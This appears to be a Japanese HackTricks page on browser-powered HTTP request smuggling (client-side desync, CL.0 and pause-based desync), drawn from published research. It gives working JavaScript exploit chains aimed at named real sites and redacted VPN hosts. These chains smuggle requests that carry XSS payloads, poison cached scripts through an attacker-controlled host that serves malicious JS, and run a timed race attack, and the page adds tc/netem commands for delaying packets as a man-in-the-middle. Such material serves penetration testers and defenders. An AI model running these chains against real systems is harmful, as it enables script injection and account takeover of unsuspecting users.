# ブラウザHTTPリクエストスミグリング

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## CL.0/H2.0 ブラウザ互換のデシンク

この脆弱性は、**バックエンドサーバー**が**Content Length**（CL）ヘッダーを完全に**無視**しているときに発生します。そのため、バックエンドは**ボディ**を**2番目のリクエストのメソッドの開始**として扱います。CLを無視することは、値が0であるとして扱うことと同等であり、これはCL.0デシンク（[既知の攻撃クラス](https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf)ですが、あまり探求されていない）です。

![](<../../.gitbook/assets/image (3) (1) (2).png>)

この攻撃が可能だったのは、バックエンドサーバーが単純に**POSTリクエストを期待していなかった**ためです。

{% hint style="warning" %}
この脆弱性は、完全に**有効で、仕様に準拠したHTTPリクエスト**によって**トリガー**されています。これは、フロントエンドがそれに対して保護する**可能性がゼロ**であり、ブラウザでもトリガーされる可能性があります。
{% endhint %}

**CL.0**と**H2.0**の唯一の**違い**は、後者が**HTTP2**を使用していることです（暗黙のContent-Lengthヘッダーがある）が、**バックエンドはそれを使用していません**。

## クライアントサイドデシンク

従来のデシンク攻撃は、**フロントエンドとバックエンド**サーバー間の**接続**を**破壊**し、フロントエンド/バックエンドアーキテクチャを使用していないウェブサイトでは不可能です。これらは今後は**サーバーサイドデシンク**と呼ばれます。ほとんどの**サーバーサイドデシンク**は、**カスタムHTTPクライアントが不正なリクエストを発行**することでのみトリガーできます。

ブラウザがデシンクを引き起こす能力により、**クライアントサイドデシンク**（CSD）と呼ばれる新しい脅威クラスが生まれます。\
CSD攻撃は、**被害者が攻撃者のウェブサイト**を訪れ、それにより**ブラウザが脆弱なウェブサイトに2つのクロスドメインリクエストを送信**します。**最初の**リクエストは、**ブラウザの接続をデシンク**させ、**2番目のリクエストが有害な応答をトリガー**し、通常は攻撃者が被害者のアカウントを制御することを可能にします。

### 検出

CSDベクトルは、HTTPリクエストに**2つの****主要な**プロパティを持っています。

まず、**サーバーはリクエストのContent-Length（CL）を無視**する必要があります。これは通常、リクエストがサーバーエラーを**トリガー**したか、サーバーが選択したエンドポイントへの**POSTリクエストを単に期待していなかった**ために発生します。**静的ファイル**と**サーバーレベルのリダイレクト**を対象にし、**長すぎるURL**や**半正常な**URL（例：/%2e%2e）を使用してエラーをトリガーしてみてください。

次に、リクエストは**ウェブブラウザのクロスドメインでトリガー可能**である必要があります。ブラウザはクロスドメインリクエストに対する制御を厳しく制限しているため、ヘッダーやボディに対する制御は制限されます。ボディを持つ場合はHTTP POSTメソッドを使用する必要があります。最終的には、**URL**と、**Refererヘッダー**、**ボディ**、**Content-Typeの後半部分**などのいくつかの細々したものを制御できます。

#### CLの無視テスト

このミスコンフィグをテストする方法は、**2つのリクエストを送信し、その間に1つをスミグリング**することです。**スミグリング**された接続が**2番目のリクエストの応答に影響**を与えた場合、それは**脆弱**であることを意味します。

![](<../../.gitbook/assets/image (1) (2) (2) (1).png>)

{% hint style="warning" %}
サーバーが**ボディ全体を受信しなかった**場合でも、**送信されたContent-Lengthよりも大きなContent-Length**を送信して**タイムアウトを探す**だけでは、この脆弱性をテストすることはできません。
{% endhint %}

対象のウェブサイトがHTTP/2をサポートしているかどうかに注意することが重要です。CSD攻撃は通常、HTTP/1.1の接続再利用を悪用し、ウェブブラウザは可能な限りHTTP/2を使用する傾向があるため、対象のウェブサイトがHTTP/2をサポートしている場合、攻撃はうまくいかない可能性があります。ただし、**例外**があります。一部の**フォワードプロキシはHTTP/2をサポートしていない**ため、それを使用しているユーザーを攻撃することができます。これには企業のプロキシ、特定の侵入型VPN、さらには一部のセキュリティツールも含まれます。
### 確認

まず、攻撃を実行するためのサイトを選択します。このサイトは**HTTPS経由でアクセス**され、**ターゲットとは異なるドメイン**に存在する必要があります。

次に、**プロキシが設定されていないこと**を確認し、攻撃サイトにアクセスします。**開発者ツール**を開き、**ネットワークタブ**に切り替えます。後で潜在的な問題のデバッグを支援するために、以下の調整を行うことをおすすめします：

* **「ログを保持する」** チェックボックスを選択します。
* 列ヘッダーを右クリックし、**「接続ID」列を有効にします**。

開発者コンソールに切り替えて、fetch()を使用して攻撃シーケンスを再現するJavaScriptを実行します。以下のような形になるかもしれません：
```javascript
fetch('https://example.com/', {
method: 'POST',
body: "GET /hopefully404 HTTP/1.1\r\nX: Y", // malicious prefix
mode: 'no-cors', // ensure connection ID is visible
credentials: 'include' // poison 'with-cookies' pool
}).then(() => {
location = 'https://example.com/' // use the poisoned connection
})
```
私はfetchモードを**'no-cors'**に設定しました。これにより、Chromeがネットワークタブで**接続IDを表示**することができます。また、Chromeには[**2つの別々の接続プール**](https://www.chromium.org/developers/design-documents/network-stack/preconnect)があるため、**クッキーを含むリクエスト**用と**クッキーを含まないリクエスト**用の2つのプールがあります。通常、**ナビゲーション**を悪用したい場合は、**'with-cookies'プール**を使用するため、常にそのプールを攻撃する習慣を身につける価値があります。

これを実行すると、ネットワークタブに**2つのリクエスト**が表示され、**2番目のリクエスト**が**404**をトリガーするはずです。

![](<../../.gitbook/assets/image (158) (2).png>)

これが期待どおりに動作する場合、おめでとうございます。クライアントサイドのデシンクを見つけました！

### 攻撃 - 保存

1つのオプションは、ターゲットサイト上で**テキストデータを保存**できる機能を特定し、プレフィックスを作成して、被害者のクッキー、認証ヘッダー、またはパスワードが**取得可能な場所に保存**されるようにすることです。この攻撃フローは、[サーバーサイドのリクエストスミグリングとほぼ同じ方法で機能します](https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests)ので、詳細には触れません。

### 攻撃 - **チェーン＆ピボット**

通常の状況では、多くの**サーバーサイド攻撃**は、**ブラウザが送信を拒否する**HTTPリクエストに依存するため、直接ターゲットウェブサイトにアクセスできる攻撃者によってのみ実行できます。これには、**HTTPヘッダー**の**改ざん**、Webキャッシュの汚染、ほとんどのサーバーサイドリクエストスミグリング、ホストヘッダー攻撃、User-Agentベースの[SQLi](https://portswigger.net/web-security/sql-injection)、CSRF JSON Content-typeなどが含まれます。

成功した攻撃への最も簡単なパスは、通常のサーバーサイドデシンク攻撃に使用される2つの主要なテクニックから来ました：[**Host-headerリダイレクトを介したJavaScriptリソース汚染**](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect)、および有害なHTMLを含むレスポンスをスプライスするための[**HEADメソッド**](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#non-blind-request-tunnelling-using-head)の使用。両方のテクニックは、**被害者のブラウザ**での操作に関連するいくつかの新しい課題を克服するために**適応**する必要がありました。

## 攻撃例

### スタックされたHEADの例

* **カラーの攻撃**

![](<../../.gitbook/assets/image (2) (3).png>)

* **JSの攻撃**
```javascript
fetch('https://www.capitalone.ca/assets', {
method: 'POST',
// use a cache-buster to delay the response
body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
credentials: 'include',
mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
location = 'https://www.capitalone.ca/'
})va
```
説明：

* /assetsでのCL.0の悪用（/assets/にリダイレクトし、CLをチェックしない）
* HEADリクエストをスマグル（HEADのレスポンスにはまだcontent-lengthが含まれているため）
* ペイロードでレスポンスに反映されるGETリクエストをスマグルする
* HEADリクエストのcontent-lengthのため、このリクエストのレスポンスはHEADリクエストの本文になる
* corsモードを設定する。通常は行われないが、この場合、サーバーの応答は初期のPOSTに対するリダイレクトであり、それに従うとエクスプロイトは機能しない。したがって、corsモードを使用してエラーをトリガーし、被害者を`catch`でリダイレクトする。

### ホストヘッダーリダイレクト+クライアントサイドキャッシュポイズニング

* JSエクスプロイト
```javascript
fetch('https://redacted/', {
method: 'POST',
body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y",
credentials: 'include'}
).catch(() => { location='https://redacted/+CSCOE+/win.js' })
```
* `/+webvpn+/`へのリクエストは、Hostヘッダー内の**異なるドメイン**で**リダイレクト**され、その**ドメイン**内の`/+webvpn+/index.html`にリダイレクトされます。
* **2番目**のリクエストの場所は、`.js`ファイルの**キャッシュ**を**汚染**するために`/+CSCOE+/win.js`に設定されます。
* このリクエストは、`/+webvpn+/`へのリダイレクトが攻撃者のドメインにパス`/+webvpn+/index.html`で応答されます。
* **`win.js`**の**キャッシュ**は、**攻撃者**のページへの**リダイレクト**で**汚染**されますが、`location`変数で割り当てられたため、**被害者**もリダイレクトに**従い**、攻撃者のウェブページに到達します。
* 攻撃者はその後、**被害者**を`https://redacted/+CSCOE+/logon.html`に**リダイレクト**します。このページは`/+CSCOE+/win.js`をインポートします。その**キャッシュは攻撃者**のサーバーへの**リダイレクト**であるため、攻撃者は**悪意のあるJS**で応答することができます。

**被害者**は**攻撃者**のページに**2回アクセス**します。最初のアクセスでは、被害者は`https://redacted/+CSCOE+/logon.html`にリダイレクトする**HTML**を期待し、2回目のアクセスでは**JavaScriptコード**（ペイロード）を期待します。ポリグロットを使用して、両方の応答を1つの応答で提供することができます。
```
HTTP/1.1 200 OK
Content-Type: text/html

alert('oh dear')/*<script>location = 'https://redacted/+CSCOE+/logon.html'</script>*/
```
### HEADペイロードとチャンク化されたTE

CSDを探す際には、`/..%2f`や`/%2f`のような**半正常な**URLもテストすることができます。

* **カラーのエクスプロイト**

![](<../../.gitbook/assets/image (5) (2) (1).png>)

* **JSエクスプロイト**
```javascript
fetch('https://www.verisign.com/%2f', {
method: 'POST',
body: `HEAD /assets/languagefiles/AZE.html HTTP/1.1\r\nHost: www.verisign.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n34d\r\nx`,
credentials: 'include',
headers: {'Content-Type': 'application/x-www-form-urlencoded'
}}).catch(() => {
let form = document.createElement('form')
form.method = 'POST'
form.action = 'https://www.verisign.com/robots.txt'
form.enctype = 'text/plain'
let input = document.createElement('input')
input.name = '0\r\n\r\nGET /<svg/onload=alert(1)> HTTP/1.1\r\nHost: www.verisign.com\r\n\r\nGET /?aaaaaaaaaaaaaaa HTTP/1.1\r\nHost: www.verisign.com\r\n\r\n'
input.value = ''
form.appendChild(input)
document.body.appendChild(form)
form.submit()
}
```
* ページ **`/%2f`** にアクセスして、**CL.0** の脆弱性を **悪用** します。
* **`Transfer-Encoding: chunked` ヘッダー** を使用して、**HEAD** リクエストをスマグリングします。
* このヘッダーは、**サーバーがボディを含む HEAD リクエストを拒否するため**、このシナリオでは必要です。
* 次に、ユーザーは、前の HEAD リクエストの **終了チャンク** と、**スマグリングされた新しいリクエスト**（JS ペイロードを含む）を含む POST を送信します。このリクエストは、レスポンスに **反映** されます。
* したがって、ブラウザは **HEAD リクエストへのレスポンス** を、POST リクエストへのレスポンスとして扱い、2番目のスマグリングされたリクエストの **ユーザーの入力を反映した** レスポンスを **ボディ** に含みます。

### ホストヘッダーリダイレクト + RC

* **JS 攻撃**
```html
<script>
function reset() {
fetch('https://vpn.redacted/robots.txt',
{mode: 'no-cors', credentials: 'include'}
).then(() => {
x.location = "https://vpn.redacted/dana-na/meeting/meeting_testjs.cgi?cb="+Date.now()
})
setTimeout(poison, 120) // worked on 140. went down to 110
}

function poison(){
sendPoison()
sendPoison()
sendPoison()
setTimeout(reset, 1000)
}

function sendPoison(){
fetch('https://vpn.redacted/dana-na/css/ds_1234cb049586a32ce264fd67d524d7271e4affc0e377d7aede9db4be17f57fc1.css',
{
method: 'POST',
body: "GET /xdana-na/imgs/footerbg.gif HTTP/1.1\r\nHost: x.psres.net\r\nFoo: '+'a'.repeat(9826)+'\r\nConnection: keep-alive\r\n\r\n",
mode: 'no-cors',
credentials: 'include'
}
)
}

</script>
<a onclick="x = window.open('about:blank'); reset()">Start attack</a>
```
この場合も、**ホストヘッダ**の**リダイレクト**を利用して、**JS**のインポートを**乗っ取る**ことができます。ただし、今回は**リダイレクトがキャッシュされない**ため、クライアント側の**キャッシュの汚染**は選択肢にありません。

したがって、攻撃は**被害者が脆弱なページにアクセス**するタイミングで、JSファイルの読み込み直前にソケットの**スマグリング接続**（この場合は3つ）を**改ざん**します。\
**タイミング**が非常に**正確**である必要があるため、攻撃は動作するまで**各反復で新しいタブ**に対して行われます。

{% hint style="warning" %}
この場合、`/meeting_testjs.cgi`が攻撃対象となりましたが、これは**404**を返す**Javascript**を**読み込んでいる**ため、キャッシュされていません。キャッシュされた**JSを攻撃しようとする他のシナリオ**では、新しい攻撃を開始する前にキャッシュから**JSが消えるのを待つ**必要があります。
{% endhint %}

要約手順：

* 新しいウィンドウを開く。
* タイミングをより一貫性のあるものにするため、ターゲットに無害なリクエストを送信して新しい接続を確立する。
* ウィンドウをターゲットページの/meeting\_testjs.cgiに移動する。
* 120ms後、リダイレクトガジェットを使用して3つの改ざんされた接続を作成する。
* 5ms後、/meeting\_testjs.cgiをレンダリングしている間に、被害者は/appletRedirect.jsをインポートしようと試み、x.psres.netにリダイレクトされ、悪意のあるJSが提供されることを期待します。
* もし成功しなければ、攻撃を再試行します。

## ポーズに基づく非同期化 <a href="#pause" id="pause"></a>

ポーズをかけることで、**誤ったリクエストタイムアウトの実装を誘発**し、新たな非同期化の脆弱性を作り出すこともできます。

したがって、攻撃者は**ボディが存在することを示すヘッダを含むリクエストを送信**し、**フロントエンドがボディを送信する前にタイムアウトするのを待ちます**。フロントエンドがタイムアウトしても**接続を開いたままにする**場合、そのリクエストの**ボディ**は**新しいリクエスト**として扱われます。

### 例：**Varnish**

Varnishキャッシュには、リクエストをバックエンドに転送せずに**レスポンスを発行**する`synth()`という機能があります。以下は、フォルダへのアクセスをブロックするために使用されるルールの例です：
```javascript
if (req.url ~ "^/admin") {
return (synth(403, "Forbidden"));
}
```
部分リクエストを処理する際に、Varnishは合成ルールに一致する場合、データを受信しない場合には**15秒間**タイムアウトします。これが発生すると、Varnishはソケットからリクエストの半分しか読み取っていないにもかかわらず、接続を再利用するために**接続を開いたままにします**。つまり、クライアントがHTTPリクエストの**後半を送信すると、新しいリクエスト**として解釈されます。

脆弱なフロントエンドで一時停止ベースのデシンクをトリガーするには、ヘッダーを送信し、ボディを約束してから待機します。最終的にはレスポンスを受け取り、リクエストボディを送信すると、それが新しいリクエストとして解釈されます。

![](<../../.gitbook/assets/image (4) (3) (1).png>)

{% hint style="warning" %}
2022年1月25日に[CVE-2022-23959](https://varnish-cache.org/security/VSV00008.html)として修正されたようです。
{% endhint %}

### 例: **Apache**

Varnishと同様に、アプリケーションがリクエストを処理するのではなく、サーバー自体がレスポンスを生成する**エンドポイント**で脆弱です。サーバーレベルのリダイレクトでもこれが発生します: `Redirect 301 / /en`

### サーバーサイドの攻撃 <a href="#server" id="server"></a>

脆弱なサーバー（この場合はApacheまたはVarnish）がバックエンドにある場合、バックエンドサーバー（この場合はHTTPヘッダー）にリクエストを**バッファリングせずにストリーミングする**フロントエンドが必要です。

![](<../../.gitbook/assets/image (3) (3).png>)

この場合、攻撃者は**ボディを送信するまでレスポンスのタイムアウトを受け取りません**。しかし、タイムアウトを知っていれば、これは問題ありません。

AmazonのApplication Load Balancer（ALB）は、必要に応じて接続のデータを**ストリーミング**しますが、**ボディ**を受け取る**前に**半分のリクエスト（タイムアウト）の**レスポンス**を受け取ると、**ボディ**を送信しないため、ここで**競合状態**を利用する必要があります。

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**ApacheをALBの背後で攻撃する場合**、両方のサーバーにはデフォルトで**60秒のタイムアウト**が設定されています。したがって、リクエストの2番目の部分を送信するための**非常に短い時間枠**が残されます。RC攻撃は最終的に66時間後に成功しました。

### MITM攻撃

ブラウザからのリクエストを一時停止してPause-desyncの脆弱性を悪用することは**できないようです**。ただし、ブラウザが送信するリクエストを一時停止するためには、常に**MITM攻撃を実行**することができます。この攻撃は、トラフィックを復号化することなく行われるため、注意が必要です。

攻撃フローは、通常のクライアントサイドデシンク攻撃と非常に**似ています**。ユーザーは攻撃者が制御するページを訪れ、ターゲットアプリケーションに対して一連の**クロスドメインリクエスト**を発行します。**最初のHTTP**リクエストは意図的に**大きくパディングされているため、オペレーティングシステムはそれを複数のTCPパケットに分割**し、アクティブな**MITMが最後のパケットを遅延**させ、一時停止ベースのデシンクをトリガーします。パディングのおかげで、**攻撃者**は**サイズ**に基づいて**どのパケットを一時停止**するかを**特定**できます。

クライアント側から見ると、リクエストのパディングを除いて、通常のクライアントサイドデシンクと同じように見えます。
```javascript
let form = document.createElement('form')
form.method = 'POST'
form.enctype = 'text/plain'
form.action = 'https://x.psres.net:6082/redirect?'+"h".repeat(600)+ Date.now()
let input = document.createElement('input')
input.name = "HEAD / HTTP/1.1\r\nHost: x\r\n\r\nGET /redirect?<script>alert(document.domain)</script> HTTP/1.1\r\nHost: x\r\nFoo: bar"+"\r\n\r\n".repeat(1700)+"x"
input.value = "x"
form.append(input)
document.body.appendChild(form)
form.submit()
```
攻撃者のシステムでの盲目的なMITM攻撃では、遅延はtc-NetEmを使用して実装されました。
```bash
# Setup
tc qdisc add dev eth0 root handle 1: prio priomap

# Flag packets to 34.255.5.242 that are between 700 and 1300 bytes
tc filter add dev eth0 protocol ip parent 1:0 prio 1 basic \
match 'u32(u32 0x22ff05f2 0xffffffff at 16)' \
and 'cmp(u16 at 2 layer network gt 0x02bc)' \
and 'cmp(u16 at 2 layer network lt 0x0514)' \
flowid 1:3

# Delay flagged packets by 61 seconds
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s
```
## **参考文献**

* この記事の情報は、[https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)から取得されました。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの**企業を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
